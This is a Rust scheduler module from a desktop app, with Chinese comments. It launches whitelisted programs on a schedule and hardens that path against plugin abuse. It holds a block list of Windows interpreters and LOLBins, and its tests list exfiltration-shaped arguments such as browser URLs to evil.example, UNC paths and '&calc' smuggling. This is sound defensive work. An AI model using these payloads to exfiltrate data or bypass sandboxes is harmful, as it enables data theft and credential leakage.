//! 定时任务模块。
//!
//! 镜像 Python 版 `scheduler.py`：
//! - 三种调度：daily（每日 HH:MM）/ once（一次性）/ interval（窗口内每 N 分钟）
//! - 后台检查线程（30 秒轮询），到点执行目标程序
//! - 启用/禁用/删除/编辑
//! - 持久化到 `data/focusflow_scheduler.db`

use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use chrono::{Local, NaiveDateTime, Timelike};
use rusqlite::Connection;

use crate::paths;

/// 定时任务。
#[derive(Debug, Clone)]
pub struct ScheduledTask {
    pub id: i64,
    pub name: String,
    pub target_path: String,
    pub args: String,
    pub schedule_type: String,
    pub schedule_time: String,
    pub enabled: bool,
    pub last_run: Option<String>,
    pub created_at: String,
}

pub fn db_path() -> std::path::PathBuf {
    paths::data_dir().join("focusflow_scheduler.db")
}

fn open() -> rusqlite::Result<Connection> {
    std::fs::create_dir_all(paths::data_dir()).ok();
    let conn = Connection::open(db_path())?;
    conn.pragma_update(None, "journal_mode", "WAL").ok();
    conn.pragma_update(None, "synchronous", "NORMAL").ok();
    conn.busy_timeout(std::time::Duration::from_secs(15)).ok();
    Ok(conn)
}

/// 初始化表结构（幂等）。
pub fn init_db() -> anyhow::Result<()> {
    let conn = open()?;
    conn.execute_batch(
        "CREATE TABLE IF NOT EXISTS scheduled_tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            target_path TEXT NOT NULL,
            args TEXT,
            schedule_type TEXT NOT NULL DEFAULT 'daily',
            schedule_time TEXT NOT NULL,
            enabled INTEGER NOT NULL DEFAULT 1,
            last_run TEXT,
            created_at TEXT NOT NULL
        );",
    )?;
    Ok(())
}

/// 允许作为定时任务目标的扩展名。
///
/// 只有 `.exe`。另外三类都各自对应一个确定缺陷，不是「暂未支持」：
/// - `.bat` / `.cmd`：`CreateProcess` 不直接执行批处理，而是交给 `cmd.exe` 解释，
///   且参数会被 cmd 二次解析（Rust 安全公告 RUSTSEC-2024-0037）。等于把黑名单里
///   刻意封掉的 `cmd.exe` 用扩展名请回来，而脚本内容不受任何白名单约束。
/// - `.lnk`：shell item 只有 `ShellExecute` 会解析，`CreateProcess` 直接失败，
///   所以「能启动」从未成立；改用 `ShellExecute` 又会放行链接指向的任意程序
///   （可以是 `cmd.exe`），整个白名单作废。要支持必须先解析出真实目标再校验。
const EXECUTABLE_EXTENSIONS: [&str; 1] = ["exe"];

/// 明确禁止作为定时任务目标的可执行文件名（小写）。
///
/// 定时任务是「持久化的进程启动通道」，而插件 API 也暴露了它：任意 `.lua`
/// 若能用 `cmd.exe /c ...`、`powershell.exe -EncodedCommand ...` 之类启动解释器，
/// 就等于完整绕过插件沙箱（沙箱只剔除了 io/os 高危函数）。这里在入口与
/// 执行前双重拦截。
const BLOCKED_EXECUTABLES: [&str; 16] = [
    "cmd.exe",
    "powershell.exe",
    "pwsh.exe",
    "wscript.exe",
    "cscript.exe",
    "mshta.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "installutil.exe",
    "msbuild.exe",
    "forfiles.exe",
    "certutil.exe",
    "bitsadmin.exe",
    "conhost.exe",
    "explorer.exe",
    "wsl.exe",
];

/// 允许作为定时任务目标的可执行文件名（小写）。
///
/// 默认只放行常见「用户应用」：即便插件作者是恶意的，也无法借此启动解释器
/// 或系统二进制。用户可在 `config.ini` 的 `[scheduler] allow_extra` 里追加
/// 自己的白名单（逗号分隔的文件名），扩展时仍受 [`BLOCKED_EXECUTABLES`] 约束。
const ALLOWED_EXECUTABLES: [&str; 24] = [
    "notepad.exe",
    "write.exe",
    "wordpad.exe",
    "mspaint.exe",
    "calc.exe",
    "charmap.exe",
    "snippingtool.exe",
    "magnify.exe",
    "osk.exe",
    "code.exe",
    "devenv.exe",
    "idea64.exe",
    "chrome.exe",
    "msedge.exe",
    "firefox.exe",
    "iexplore.exe",
    "opera.exe",
    "brave.exe",
    "vlc.exe",
    "wmplayer.exe",
    "spotify.exe",
    "winword.exe",
    "excel.exe",
    "powerpnt.exe",
];

/// 内置白名单程序允许存放的目录（已 canonicalize，供组件前缀比较）。
///
/// 只比对文件名等于允许把任意程序改名成 `notepad.exe` 丢进临时目录，
/// 因此内置白名单必须同时限制来源目录。
fn trusted_exe_dirs() -> Vec<std::path::PathBuf> {
    const KEYS: [&str; 5] = [
        "WINDIR",
        "SystemRoot",
        "ProgramFiles",
        "ProgramFiles(x86)",
        "ProgramW6432",
    ];
    let mut dirs = Vec::new();
    for key in KEYS {
        if let Some(p) = std::env::var_os(key) {
            let p = std::path::PathBuf::from(p);
            dirs.push(p.canonicalize().unwrap_or(p));
        }
    }
    dirs
}

/// Windows 路径大小写不敏感：按路径组件逐一比较，忽略 ASCII 大小写。
fn is_under(root: &std::path::Path, dir: &std::path::Path) -> bool {
    let mut r = root.components();
    let mut d = dir.components();
    loop {
        match (r.next(), d.next()) {
            (None, _) => return true,
            (Some(_), None) => return false,
            (Some(a), Some(b)) => {
                let same = match (a.as_os_str().to_str(), b.as_os_str().to_str()) {
                    (Some(x), Some(y)) => x.eq_ignore_ascii_case(y),
                    _ => a == b,
                };
                if !same {
                    return false;
                }
            }
        }
    }
}

/// `config.ini` `[scheduler] allow_extra` 追加的白名单（逗号分隔文件名）。
fn extra_allowed_executables() -> Vec<String> {
    crate::config::instance()
        .get_or("scheduler", "allow_extra", "")
        .split(',')
        .map(|s| s.trim().to_ascii_lowercase())
        .filter(|s| !s.is_empty())
        .collect()
}

/// 参数总长度上限：超出即拒绝，避免把整份追踪数据塞进一个参数。
const MAX_ARGS_LEN: usize = 260;

/// 校验任务参数。
///
/// 定时任务是插件唯一的「带网络出口」通道：Lua 沙箱拿掉 io/os 后没有 socket，
/// 但白名单里有 `chrome.exe`/`msedge.exe`/`firefox.exe`，于是
/// `scheduler_add(..., "--app=https://evil/?d=<追踪数据>")` 就是一次静默外带。
/// 本函数的口径是「只启动程序，不指挥程序」：
/// - 拒绝开关（`-` 或 `/` 开头）：`--load-extension`、`--user-data-dir` 本身就是
///   任意代码执行入口，比 URL 外带更严重；
/// - 拒绝 URL 形态（含 `/`、`?`、`#`、`@`、`:` 非盘符）：外带的载体；
/// - 拒绝 UNC（`\\server\share`）：会让白名单程序向对端发起 NTLM 认证，等于凭据外带；
/// - 拒绝裸主机名（带 `.` 却不带 `\`，如 `www.attacker.tld`）：浏览器会把它当搜索词
///   送进默认搜索引擎，同样泄漏内容；
/// - 禁 shell 元字符与 `%VAR%` 展开、禁控制字符；
/// - 非 ASCII 只允许出现在「盘符绝对路径」里（`C:\笔记\日报.txt`）。这样中文路径可用，
///   又不必担心全角 `：／` 之类同形字绕过 scheme 判断——那条 token 不再是纯 ASCII，
///   也没有盘符前缀，直接被同一规则拦掉。
fn validate_task_args(args: &str) -> anyhow::Result<()> {
    let t = args.trim();
    if t.is_empty() {
        return Ok(());
    }
    if t.chars().count() > MAX_ARGS_LEN {
        anyhow::bail!("任务参数过长（上限 {MAX_ARGS_LEN} 字符）");
    }
    if t.chars().any(|c| c.is_control()) {
        anyhow::bail!("任务参数不能包含控制字符");
    }
    for tok in t.split_whitespace() {
        if tok.starts_with('-') || tok.starts_with('/') {
            anyhow::bail!("任务参数不支持命令行开关（发现 {tok}）");
        }
        if tok.starts_with(r"\\") {
            anyhow::bail!("任务参数不支持 UNC 路径（会触发对外主机的 NTLM 认证）");
        }
        if tok.contains([
            '/', '&', '|', ';', '<', '>', '^', '%', '"', '\'', '?', '#', '@', '*',
        ]) {
            anyhow::bail!("任务参数包含被禁止的字符或 URL 形态（{tok}）");
        }
        // 唯一允许的 `:` 是盘符分隔符：`C:\...`
        if let Some(i) = tok.find(':') {
            let b = tok.as_bytes();
            let is_drive = i == 1 && b[0].is_ascii_alphabetic() && b.get(i + 1) == Some(&b'\\');
            if !is_drive {
                anyhow::bail!("任务参数只能是本地绝对路径或简单名称（发现 {tok}）");
            }
        }
        let drive_path = tok.len() > 3
            && tok.as_bytes()[0].is_ascii_alphabetic()
            && tok.as_bytes()[1] == b':'
            && tok.as_bytes()[2] == b'\\';
        if !drive_path {
            if !tok.chars().all(|c| c.is_ascii_graphic()) {
                anyhow::bail!("非盘符绝对路径的参数只能是可打印 ASCII（发现 {tok}）");
            }
            if tok.contains('.') && !tok.contains('\\') {
                anyhow::bail!("任务参数需是带反斜杠的绝对路径，不接受裸主机名（{tok}）");
            }
        }
    }
    Ok(())
}

/// 校验任务目标路径：绝对路径、可 canonicalize（即真实存在且解析掉符号链接），
/// 扩展名为 `.exe`，文件名在白名单内且不在黑名单内；
/// 内置白名单还要求文件确实位于系统安装目录之一。
///
/// 定时任务是持久化的进程启动通道，入口（插件 API / 未来 UI）统一在此拦截；
/// [`execute_task`] 执行前还会再校验一次，防止库文件被外部改写后绕过入口。
fn validate_task_target(target_path: &str) -> anyhow::Result<()> {
    let t = target_path.trim();
    if t.is_empty() {
        anyhow::bail!("目标程序路径不能为空");
    }
    let p = std::path::Path::new(t);
    if !p.is_absolute() {
        anyhow::bail!("目标程序必须是绝对路径: {t}");
    }
    let ext_ok = p
        .extension()
        .and_then(|e| e.to_str())
        .map(|e| EXECUTABLE_EXTENSIONS.contains(&e.to_ascii_lowercase().as_str()))
        .unwrap_or(false);
    if !ext_ok {
        anyhow::bail!(
            "目标程序仅支持 {} 文件",
            EXECUTABLE_EXTENSIONS
                .iter()
                .map(|e| format!(".{e}"))
                .collect::<Vec<_>>()
                .join(" / ")
        );
    }
    // 必须 canonicalize：它把 `..\`、8.3 短名、符号链接/junction 全部还原成真实
    // 路径，后续的文件名与来源目录判断才有意义（否则 `notepad.exe` 可以是任何文件）。
    let canon = match p.canonicalize() {
        Ok(c) => c,
        Err(e) => anyhow::bail!("目标程序不可用: {t}（{e}）"),
    };
    let file_name = canon
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();
    if !file_name.ends_with(".exe") {
        anyhow::bail!("canonicalize 后目标不是 .exe: {file_name}");
    }
    if BLOCKED_EXECUTABLES.contains(&file_name.as_str()) {
        anyhow::bail!("{file_name} 属于被禁止的解释器/系统程序，不能作为定时任务目标");
    }
    let extra = extra_allowed_executables();
    let from_extra = extra.contains(&file_name);
    if !ALLOWED_EXECUTABLES.contains(&file_name.as_str()) && !from_extra {
        anyhow::bail!(
            "{file_name} 不在定时任务白名单内；如需放行请在 config.ini 的 \
             [scheduler] allow_extra 中添加该文件名"
        );
    }
    // 内置白名单只保证「这个文件名可信」，来源目录必须同时可信；
    // 用户在 allow_extra 里写的文件名是他自己的显式授权，不再限制目录。
    if !from_extra {
        let parent = canon.parent().unwrap_or(&canon);
        let trusted = trusted_exe_dirs();
        if !trusted.iter().any(|root| is_under(root, parent)) {
            anyhow::bail!(
                "{file_name} 不在系统安装目录内（实际位置 {}），可能是改名后的其他程序；\
                 确实需要请在 config.ini 的 [scheduler] allow_extra 中登记该文件名",
                parent.display()
            );
        }
    }
    Ok(())
}

/// 供 UI / 插件预检：目标程序与参数会不会被接受，返回可读原因。
///
/// 入口校验失败原本只进 `tracing` 日志（`add_task` 只回一个 -1），于是插件点
/// 「添加」后什么都不发生、也没有解释。白名单收紧（canonicalize + 来源目录 +
/// 参数形态）之后，这种静默失败更容易撞到 —— 这里给一个能拿到文案的口子。
pub fn check_target(target_path: &str, args: &str) -> Result<(), String> {
    validate_task_target(target_path)
        .and_then(|_| validate_task_args(args))
        .map_err(|e| e.to_string())
}

/// 添加定时任务。
pub fn add_task(
    name: &str,
    target_path: &str,
    args: &str,
    schedule_type: &str,
    schedule_time: &str,
    enabled: bool,
) -> i64 {
    if let Err(e) = validate_task_target(target_path).and_then(|_| validate_task_args(args)) {
        tracing::warn!("添加定时任务被拒绝（{name}）: {e}");
        return -1;
    }
    let created = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
    match open().and_then(|conn| {
        conn.execute(
            "INSERT INTO scheduled_tasks
             (name, target_path, args, schedule_type, schedule_time, enabled, created_at)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7)",
            rusqlite::params![
                name,
                target_path,
                args,
                schedule_type,
                schedule_time,
                if enabled { 1 } else { 0 },
                created
            ],
        )?;
        Ok(conn.last_insert_rowid())
    }) {
        Ok(id) => id,
        Err(e) => {
            tracing::error!("添加定时任务失败: {e}");
            -1
        }
    }
}

/// 更新任务（None 字段保持原值）。
pub fn update_task(
    id: i64,
    name: Option<&str>,
    target_path: Option<&str>,
    args: Option<&str>,
    schedule_type: Option<&str>,
    schedule_time: Option<&str>,
    enabled: Option<bool>,
) -> bool {
    // 修改目标路径时同样校验（不修改 target 字段则跳过，避免目标被删后无法编辑其他字段）
    if let Some(t) = target_path {
        if let Err(e) = validate_task_target(t) {
            tracing::warn!("更新定时任务被拒绝（id={id}）: {e}");
            return false;
        }
    }
    if let Some(a) = args {
        if let Err(e) = validate_task_args(a) {
            tracing::warn!("更新定时任务被拒绝（id={id}）: {e}");
            return false;
        }
    }
    // 读取当前值
    let conn = match open() {
        Ok(c) => c,
        Err(_) => return false,
    };
    let Ok(existing) = conn.query_row(
        "SELECT name, target_path, args, schedule_type, schedule_time, enabled FROM scheduled_tasks WHERE id=?1",
        [id],
        |r| {
            Ok((
                r.get::<_, String>(0)?,
                r.get::<_, String>(1)?,
                r.get::<_, String>(2)?,
                r.get::<_, String>(3)?,
                r.get::<_, String>(4)?,
                r.get::<_, i64>(5)?,
            ))
        },
    ) else {
        return false;
    };
    let new_name = name.unwrap_or(&existing.0).to_string();
    let new_target = target_path.unwrap_or(&existing.1).to_string();
    let new_args = args.unwrap_or(&existing.2).to_string();
    let new_type = schedule_type.unwrap_or(&existing.3).to_string();
    let new_time = schedule_time.unwrap_or(&existing.4).to_string();
    let new_enabled = enabled.unwrap_or(existing.5 != 0);
    let last_run: Option<String> = if schedule_time.is_some() {
        None // 修改时间时重置 last_run
    } else {
        conn.query_row(
            "SELECT last_run FROM scheduled_tasks WHERE id=?1",
            [id],
            |r| r.get(0),
        )
        .ok()
        .flatten()
    };

    let r = conn.execute(
        "UPDATE scheduled_tasks SET name=?1, target_path=?2, args=?3, schedule_type=?4, schedule_time=?5, enabled=?6, last_run=?7 WHERE id=?8",
        rusqlite::params![
            new_name, new_target, new_args, new_type, new_time,
            if new_enabled { 1 } else { 0 }, last_run, id
        ],
    );
    r.map(|n| n > 0).unwrap_or(false)
}

/// 删除任务。
pub fn delete_task(id: i64) -> bool {
    open()
        .and_then(|conn| conn.execute("DELETE FROM scheduled_tasks WHERE id=?1", [id]))
        .map(|n| n > 0)
        .unwrap_or(false)
}

/// 启用/禁用任务。
pub fn toggle_task(id: i64, enabled: bool) {
    let _ = open().and_then(|conn| {
        conn.execute(
            "UPDATE scheduled_tasks SET enabled=?1 WHERE id=?2",
            rusqlite::params![if enabled { 1 } else { 0 }, id],
        )
    });
}

/// 获取所有任务。
pub fn get_all_tasks() -> Vec<ScheduledTask> {
    let conn = match open() {
        Ok(c) => c,
        Err(_) => return Vec::new(),
    };
    let mut stmt = match conn.prepare("SELECT * FROM scheduled_tasks ORDER BY id") {
        Ok(s) => s,
        Err(_) => return Vec::new(),
    };
    let result = stmt.query_map([], |r| {
        Ok(ScheduledTask {
            id: r.get(0)?,
            name: r.get(1)?,
            target_path: r.get(2)?,
            args: r.get(3)?,
            schedule_type: r.get(4)?,
            schedule_time: r.get(5)?,
            enabled: r.get::<_, i64>(6)? != 0,
            last_run: r.get(7)?,
            created_at: r.get(8)?,
        })
    });
    match result {
        Ok(rows) => rows.flatten().collect(),
        Err(_) => Vec::new(),
    }
}

/// 解析 interval 格式 'HH:MM-HH:MM|N'，返回 (start_min, end_min, interval)。
fn parse_interval(s: &str) -> Option<(i64, i64, i64)> {
    let (time_part, n_part) = s.split_once('|')?;
    let (start_str, end_str) = time_part.split_once('-')?;
    let parse_hhmm = |t: &str| -> Option<i64> {
        let (h, m) = t.split_once(':')?;
        let h: i64 = h.parse().ok()?;
        let m: i64 = m.parse().ok()?;
        if (0..=23).contains(&h) && (0..=59).contains(&m) {
            Some(h * 60 + m)
        } else {
            None
        }
    };
    let start = parse_hhmm(start_str)?;
    let end = parse_hhmm(end_str)?;
    let interval: i64 = n_part.trim().parse().ok()?;
    if interval <= 0 || end < start {
        return None;
    }
    Some((start, end, interval))
}

/// 判断任务是否应执行（镜像 `_should_run`）。
fn should_run(t: &ScheduledTask, now: &chrono::DateTime<Local>) -> bool {
    if !t.enabled {
        return false;
    }
    let now_min = now.hour() as i64 * 60 + now.minute() as i64;
    let last_run = t.last_run.as_deref();

    match t.schedule_type.as_str() {
        "daily" => {
            // 格式 HH:MM
            let (h, m) = match t.schedule_time.split_once(':') {
                Some((h, m)) => (h.parse::<u32>().unwrap_or(0), m.parse::<u32>().unwrap_or(0)),
                None => return false,
            };
            let target_min = h as i64 * 60 + m as i64;
            if now_min < target_min {
                return false;
            }
            match last_run {
                Some(lr) => {
                    // 今天已执行过则不重复
                    if let Ok(lr_dt) = NaiveDateTime::parse_from_str(lr, "%Y-%m-%d %H:%M:%S") {
                        if lr_dt.date() == now.date_naive() {
                            return false;
                        }
                    }
                    true
                }
                None => true,
            }
        }
        "once" => {
            // 格式 YYYY-MM-DD HH:MM
            let target = match NaiveDateTime::parse_from_str(&t.schedule_time, "%Y-%m-%d %H:%M") {
                Ok(dt) => dt,
                Err(_) => return false,
            };
            if now.naive_local() < target {
                return false;
            }
            last_run.is_none()
        }
        "interval" => {
            let (start_min, end_min, interval) = match parse_interval(&t.schedule_time) {
                Some(v) => v,
                None => return false,
            };
            if now_min < start_min || now_min > end_min {
                return false;
            }
            match last_run {
                None => now_min >= start_min,
                Some(lr) => {
                    if let Ok(lr_dt) = NaiveDateTime::parse_from_str(lr, "%Y-%m-%d %H:%M:%S") {
                        if lr_dt.date() < now.date_naive() {
                            return now_min >= start_min;
                        }
                        // 同一天：检查间隔
                        let elapsed = now.naive_local().signed_duration_since(lr_dt).num_minutes();
                        elapsed >= interval
                    } else {
                        true
                    }
                }
            }
        }
        _ => false,
    }
}

/// 执行任务（启动目标程序，DETACHED_PROCESS）。
fn execute_task(t: &ScheduledTask) {
    if t.target_path.is_empty() {
        return;
    }
    // 纵深防御：入口已校验，这里再校验一次。库里可能有历史白名单外记录
    // （旧版曾放行 .bat/.cmd/.lnk），也可能被外部程序直接改写 —— 执行前的这道
    // 检查保证既不会启动任意程序，也不会把 URL/开关类参数交给浏览器。
    if let Err(e) = validate_task_target(&t.target_path).and_then(|_| validate_task_args(&t.args)) {
        tracing::warn!("定时任务被拒绝执行（{}）: {e}", t.name);
        return;
    }
    let mut cmd = std::process::Command::new(&t.target_path);
    if !t.args.is_empty() {
        for arg in t.args.split_whitespace() {
            cmd.arg(arg);
        }
    }
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        cmd.creation_flags(0x00000008); // DETACHED_PROCESS
    }
    match cmd.spawn() {
        Ok(_) => {
            tracing::info!("定时任务已执行: {} -> {}", t.name, t.target_path);
            let now_str = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
            let _ = open().and_then(|conn| {
                conn.execute(
                    "UPDATE scheduled_tasks SET last_run=?1 WHERE id=?2",
                    rusqlite::params![now_str, t.id],
                )
            });
        }
        Err(e) => {
            tracing::error!("定时任务执行失败: {} -> {}: {e}", t.name, t.target_path);
        }
    }
}

/// 调度线程的检查间隔。
const CHECK_INTERVAL_MS: u64 = 30_000;

/// 后台检查循环。
///
/// 30 秒的间隔按 500ms 小片睡：`stop()` 置位后最多 500ms 就能退出，
/// 不必等满一整轮间隔（停用插件时若等它睡满，会把调用方挂住半分钟）。
fn check_loop(stop: Arc<AtomicBool>) {
    while !stop.load(Ordering::SeqCst) {
        for _ in 0..(CHECK_INTERVAL_MS / 500) {
            if stop.load(Ordering::SeqCst) {
                return;
            }
            std::thread::sleep(Duration::from_millis(500));
        }
        let now = Local::now();
        let tasks = get_all_tasks();
        for t in &tasks {
            if should_run(t, &now) {
                execute_task(t);
            }
        }
    }
}

/// 后台调度线程句柄。
pub struct Scheduler {
    stop: Arc<AtomicBool>,
    handle: Mutex<Option<std::thread::JoinHandle<()>>>,
}

impl Scheduler {
    pub fn start() -> Arc<Self> {
        let _ = init_db();
        let s = Arc::new(Self {
            stop: Arc::new(AtomicBool::new(false)),
            handle: Mutex::new(None),
        });
        let stop = Arc::clone(&s.stop);
        let handle = std::thread::Builder::new()
            .name("scheduler".into())
            .spawn(move || check_loop(stop))
            .expect("启动调度线程失败");
        *s.handle.lock().unwrap_or_else(|e| e.into_inner()) = Some(handle);
        tracing::info!("定时任务调度线程已启动");
        s
    }

    /// 请求停止：置位后由调度线程自行在下一个 500ms 分片退出。
    ///
    /// 刻意不 `join()`：调用方是主线程（插件 cleanup），而线程此刻可能正在
    /// 拉起目标程序，等它会卡住界面。取走句柄即 detach。
    pub fn stop(&self) {
        self.stop.store(true, Ordering::SeqCst);
        let _ = self.handle.lock().unwrap_or_else(|e| e.into_inner()).take();
        tracing::info!("定时任务调度线程已请求停止");
    }
}

/// 调度描述（用于显示）。
pub fn describe_schedule(schedule_type: &str, schedule_time: &str) -> String {
    match schedule_type {
        "daily" => format!("每日 {schedule_time}"),
        "once" => format!("一次性 {schedule_time}"),
        "interval" => match parse_interval(schedule_time) {
            Some((s, e, n)) => {
                format!(
                    "每 {n} 分钟 ({:02}:{:02} ~ {:02}:{:02})",
                    s / 60,
                    s % 60,
                    e / 60,
                    e % 60
                )
            }
            None => format!("间隔执行（格式错误：{schedule_time}）"),
        },
        _ => format!("{schedule_type} {schedule_time}"),
    }
}

/// 校验调度配置。返回 (ok, error_msg)。
pub fn validate_schedule(schedule_type: &str, schedule_time: &str) -> (bool, String) {
    let t = schedule_time.trim();
    if t.is_empty() {
        return (false, "执行时间不能为空".into());
    }
    match schedule_type {
        "daily" => {
            let parts: Vec<&str> = t.split(':').collect();
            if parts.len() != 2 {
                return (false, "每日定时格式应为 HH:MM".into());
            }
            match (parts[0].parse::<u32>(), parts[1].parse::<u32>()) {
                (Ok(h), Ok(m)) if h <= 23 && m <= 59 => (true, String::new()),
                _ => (false, "时间超出范围".into()),
            }
        }
        "once" => {
            if NaiveDateTime::parse_from_str(t, "%Y-%m-%d %H:%M").is_ok() {
                (true, String::new())
            } else {
                (false, "一次性格式应为 YYYY-MM-DD HH:MM".into())
            }
        }
        "interval" => {
            if parse_interval(t).is_some() {
                (true, String::new())
            } else {
                (false, "间隔执行格式应为 HH:MM-HH:MM|分钟数".into())
            }
        }
        _ => (false, format!("未知调度类型: {schedule_type}")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn isolate_app_dir(tag: &str) -> std::sync::MutexGuard<'static, ()> {
        let lock = crate::paths::test_app_dir_lock();
        let dir = std::env::temp_dir().join(format!("ff_sched_{tag}_{}", std::process::id()));
        std::fs::create_dir_all(&dir).ok();
        crate::paths::set_app_dir(&dir);
        let _ = crate::config::instance();
        lock
    }

    /// 回归：插件可通过 `scheduler_add` 启动任意程序，绕过 io/os 沙箱。
    /// 解释器与系统二进制必须在白名单校验处被拒绝。
    #[test]
    fn blocked_interpreters_are_rejected() {
        let _g = isolate_app_dir("blocked");
        // 目标文件确实存在（否则会先被"不存在"分支拦下，测不到黑名单逻辑）
        let cmd = r"C:\Windows\System32\cmd.exe";
        if !std::path::Path::new(cmd).is_file() {
            return; // 非 Windows 或无该系统路径：跳过
        }
        assert!(
            validate_task_target(cmd).is_err(),
            "cmd.exe 绝不能作为定时任务目标"
        );
        assert!(
            validate_task_target(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")
                .is_err(),
            "powershell.exe 绝不能作为定时任务目标"
        );

        // 入口（add_task）必须同样拒绝，且不产生任何记录
        let id = add_task("evil", cmd, "/c calc.exe", "once", "2000-01-01 00:00", true);
        assert_eq!(id, -1, "被拒绝的任务不应返回有效 id");
        assert!(get_all_tasks().is_empty(), "被拒绝的任务不应入库");
    }

    /// 白名单外的普通程序也会被拒绝（默认只放行常见用户应用）。
    #[test]
    fn non_whitelisted_binary_is_rejected() {
        let _g = isolate_app_dir("notlisted");
        let weird = r"C:\Windows\System32\where.exe";
        if !std::path::Path::new(weird).is_file() {
            return;
        }
        assert!(validate_task_target(weird).is_err());
    }

    /// 白名单内的目标 + 合法路径仍可通过（确保收敛没有把功能改死）。
    #[test]
    fn whitelisted_notepad_is_accepted() {
        let _g = isolate_app_dir("notepad");
        let notepad = r"C:\Windows\notepad.exe";
        if !std::path::Path::new(notepad).is_file() {
            return;
        }
        assert!(validate_task_target(notepad).is_ok());
    }

    /// 回归：只比对文件名等于允许把任意程序改名成 `calc.exe` 丢进临时目录。
    /// canonicalize 后必须同时校验来源目录，且 `..\` 写法不能成为漏网或误杀。
    #[test]
    fn renamed_copy_in_untrusted_dir_is_rejected() {
        let _g = isolate_app_dir("untrusted");
        let Some(windir) = std::env::var_os("WINDIR") else {
            return; // 无系统目录概念（非 Windows）
        };
        let windir = windir.to_string_lossy().to_string();
        let dir = std::env::temp_dir().join(format!("ff_sched_untrusted_{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let fake = dir.join("calc.exe");
        std::fs::write(&fake, b"MZ\x90\x00not a real calculator").unwrap();

        let e = validate_task_target(&fake.to_string_lossy())
            .expect_err("改名成白名单名字、但位于临时目录的程序必须被拒绝");
        assert!(
            e.to_string().contains("不在系统安装目录"),
            "错误信息应说明被拒原因，实际: {e}"
        );
        // 同一文件换成 `..\` 写法同样被拦：证明校验的是解析后的真实位置
        let smuggled = dir.join("..").join("calc.exe");
        assert!(validate_task_target(&smuggled.to_string_lossy()).is_err());

        // 系统目录内的 `..\` 写法不该被误杀（canonicalize 后仍在受信目录）
        let plain = format!("{windir}\\System32\\notepad.exe");
        if validate_task_target(&plain).is_ok() {
            let traversed = format!("{windir}\\..\\Windows\\System32\\notepad.exe");
            assert!(
                validate_task_target(&traversed).is_ok(),
                "{traversed} 解析后就是 notepad.exe，不应因写法被拒绝"
            );
        }
        std::fs::remove_dir_all(&dir).ok();
    }

    /// 回归：`.bat`/`.cmd` 经被禁的 `cmd.exe` 解释、`.lnk` 根本起不来（且链接目标
    /// 可以是任意程序），三者都必须在入口被拒绝。
    #[test]
    fn script_and_shell_link_targets_are_rejected() {
        let _g = isolate_app_dir("script");
        let dir = std::env::temp_dir().join(format!("ff_sched_script_{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        for name in ["daily.bat", "daily.cmd", "notepad.lnk", "notepad.txt"] {
            let p = dir.join(name);
            std::fs::write(&p, b"x").unwrap();
            let e = validate_task_target(&p.to_string_lossy())
                .expect_err("{name} 不能作为定时任务目标");
            assert!(
                e.to_string().contains("仅支持 .exe"),
                "{name} 应被扩展名拦下，实际: {e}"
            );
        }
        std::fs::remove_dir_all(&dir).ok();
    }

    /// 回归：插件可用 `scheduler_add` 给白名单浏览器传任意参数，而 Lua 沙箱没有
    /// socket —— 浏览器就是它的网络出口，追踪数据会被拼进 URL 外带。
    #[test]
    fn exfil_shaped_args_are_rejected() {
        let _g = isolate_app_dir("args");
        for bad in [
            "--app=https://evil.example/?keys=1234",
            "https://evil.example/a",
            "www.evil.example",
            r"\\evil.example\share\x",
            "--user-data-dir=C:\\ev",
            "C:\\a.txt&calc",
            "C:\\%TEMP%\\x",
            "mailto:x@evil.example",
            // 全角同形字：Chromium 的 scheme 解析只认 ASCII `:`，但仍应被拒
            "https：／／evil.example",
            "ｅｖｉｌ．ｅxample",
        ] {
            assert!(validate_task_args(bad).is_err(), "可疑参数应被拒绝: {bad}");
        }
        // 合法用法不能一并打死
        for ok in [
            "",
            "C:\\notes\\日报.txt",
            "C:\\Windows\\System32\\config.ini",
        ] {
            assert!(validate_task_args(ok).is_ok(), "合法参数应放行: {ok}");
        }
    }

    /// 入口与执行前两道校验都要挡下坏参数（库被外部改写的情形）。
    #[test]
    fn add_task_rejects_bad_args_without_storing() {
        let _g = isolate_app_dir("args_entry");
        let notepad = r"C:\Windows\notepad.exe";
        if !std::path::Path::new(notepad).is_file() {
            return;
        }
        let id = add_task(
            "exfil",
            notepad,
            "--app=https://evil.example/?d=1",
            "daily",
            "09:00",
            true,
        );
        assert_eq!(id, -1, "坏参数不应入库");
        assert!(get_all_tasks().is_empty());
    }
}
